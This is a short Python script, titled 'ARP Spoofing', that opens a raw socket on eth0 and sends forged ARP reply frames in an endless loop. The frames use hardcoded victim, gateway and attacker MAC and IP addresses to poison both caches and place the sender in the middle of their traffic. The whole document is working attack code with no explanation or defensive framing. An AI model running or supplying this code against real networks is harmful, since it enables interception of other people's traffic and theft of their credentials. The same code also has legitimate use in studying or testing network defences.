##############################################################
#                          ARP Spoofing                      #
##############################################################
import socket
import struct
import binascii
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
s.bind(("eth0",socket.htons(0x0800)))

#Define Source MAC Address
sormac = '\x00\x0c\x29\xd3\xce\x63'
#Define Victim MAC Address
victmac ='\x00\x0c\x29\x69\xe5\xc3'
#Define Gateway MAC Address
gatemac = '\x00\x50\x56\xc0\x00\x0a'

#Define ARP Protocol Code
code ='\x08\x06'
eth1 = victmac+sormac+code #for victim
eth2 = gatemac+sormac+code # for gateway

#Define Hardware Type for Ethernet
htype = '\x00\x01'
#Define Protocol Type
protype = '\x08\x00'
#Define Hardware Address Length
hsize = '\x06'
#Define Internet Protocol Address Length
psize = '\x04'
#Define Replying opcode
opcode = '\x00\x02'

gate_ip = '172.16.10.1'
victim_ip = '172.16.10.129' 
gip = socket.inet_aton ( gate_ip )
vip = socket.inet_aton ( victim_ip )

arp_victim = eth1+htype+protype+hsize+psize+opcode+sormac+gip+victmac+vip
arp_gateway= eth2+htype+protype+hsize+psize+opcode+sormac+vip+gatemac+gip


while 1:
	s.send(arp_victim)
	s.send(arp_gateway)
